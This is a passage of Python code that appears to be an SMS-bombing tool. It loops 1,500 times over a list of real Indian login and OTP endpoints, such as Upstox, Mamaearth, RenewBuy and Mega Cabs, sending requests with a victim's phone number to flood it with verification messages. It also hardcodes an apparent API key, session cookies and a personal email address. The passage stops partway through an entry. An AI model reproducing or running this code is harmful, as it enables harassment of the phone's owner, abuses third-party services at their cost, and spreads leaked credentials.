   ...
   # start_time = time.time()
    ...
    for _ in range(1500):
        apis = [
            ...
            {
                "url": "https://goplus.in/v3/auth/user/otp",
                "payload": {"phoneNumber": number, "newDevice": "false", "policyPerused": "true"},
                "headers": {"Content-Type": "application/json"}
            },
            {
            ...
            },
            {
                ...
                "payload": {"phoneNumber": number, "appPackageName": "in.ludo.supremegold"},
                "headers": {"Content-Type": "application/json"}
            },
            {
            ...
            {
                "url": "https://api.mamaearth.in/v1/auth/initiateSignup",
                "payload": {"isGupshup": True, "contact": number, "email": "shivam5755@gmail.com"},
                "headers": {"Content-Type": "application/json"}
            },
            {
            ...
            {
                "url": "https://service.upstox.com/login/open/v5/auth/1fa/otp/generate",
                "payload": {"data": {"mobileNumber": number}},
                "headers": {"Content-Type": "application/json"}
            },
            {
        ...
        },
        {
            ...
            "payload": {"mobile": number, "receive_whatsapp_notification": True},
            "headers": {"Host": "www.renewbuy.com", "Content-Length": "60", "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Android WebView";v="122"', "Finsure-Api-Key": "uSrO36ae.T2pmVn18QTC3pfObyrmf8PV8YusVJTnI", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Sec-Ch-Ua-Mobile": "?1", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.106 Mobile Safari/537.36", "Sec-Ch-Ua-Platform": '"Android"', "Origin": "https://www.renewbuy.com", "X-Requested-With": "pure.lite.browser", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.renewbuy.com/user/login", "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9", "Cookie": "_gid=GA1.2.315202297.1711129099; _gat_gtag_UA_57859131_3=1; _gat_gtag_UA_57859131_7=1; _ga=GA1.1.1724598156.1711129099; _ga_TDSE6YPSV2=GS1.1.1711129099.1.0.1711129099.60.0.0; _ga_CTWKWSPJQ1=GS1.1.1711129098.1.1.1711129139.19.0.0"}
        },
        {
        ...
        {
            "url": "https://customer.megacabs.com/api/otpforLogin",
            "payload": {"mobileNo": number, "deviceId": "47.9.111.200", "deviceType": "Website"},
            "headers": {"Content-Type": "application/json"}
        },
        {
        ...
        {
            "url": "https://mobile.otocapital.in/api/v1/otp/create/",
